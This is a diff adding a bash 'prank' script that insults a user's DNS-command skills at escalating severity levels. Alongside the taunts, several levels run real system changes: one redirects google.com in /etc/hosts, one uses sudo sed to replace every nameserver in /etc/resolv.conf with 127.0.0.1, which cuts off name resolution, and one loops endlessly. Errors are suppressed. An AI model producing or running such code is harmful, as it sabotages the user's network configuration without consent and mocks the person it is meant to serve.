@@ -1,0 +1,55 @@
+#!/bin/bash
+
+SEVERITY=$1
+
+case $SEVERITY in
+  1)
+    echo ";; communications error to nslookup-user@localhost: brain not found."
+    ;;
+  2)
+    echo "Even nslookup handles queries better than you handle a keyboard."
+    ;;
+  3)
+    echo "Are you trying to query a record or just mashing keys? Typical nslookup fan behavior."
+    ;;
+  4)
+    echo ";; ANSWER SECTION:"
+    echo "your-typing.skill.    IN    A    0.0.0.0"
+    ;;
+  5)
+    echo "I'm aliasing this command to 'nslookup' since you clearly prefer antiquated failures."
+    alias dig='nslookup'
+    ;;
+  6)
+    echo "Querying root servers... they said you should go back to Windows."
+    ;;
+  7)
+    echo "DNS Poisoning (Self-Inflicted): Pointing google.com to 127.0.0.1 in your session."
+    echo "127.0.0.1 google.com" >> /etc/hosts 2>/dev/null || echo "I'd edit your hosts file, but you'd probably typo that too."
+    ;;
+  8)
+    echo "NXDOMAIN: The user's competence does not exist in this namespace."
+    # Flush DNS cache just to be annoying
+    sudo systemd-resolve --flush-caches 2>/dev/null
+    ;;
+  9)
+    echo "I've replaced your nameservers with 127.0.0.1. Resolve that."
+    # This effectively kills their internet until they fix resolv.conf
+    sudo sed -i 's/nameserver .*/nameserver 127.0.0.1/' /etc/resolv.conf 2>/dev/null
+    ;;
+  10)
+    # The Nuclear Option: Recursive Loop
+    echo ";; WARNING: RECURSION LIMIT REACHED."
+    echo "You want an answer? Go ask nslookup. nslookup will ask me. I will ask nslookup."
+
+    # This creates a CPU-eating loop of two commands shouting at each other
+    while true; do
+      echo "dig: asking nslookup..."
+      sleep 0.1
+      echo "nslookup: 'dig is for nerds, go ask dig...'"
+    done
+    ;;
+  *)
+    echo "Invalid severity. Your TTL has expired."
+    ;;
+esac
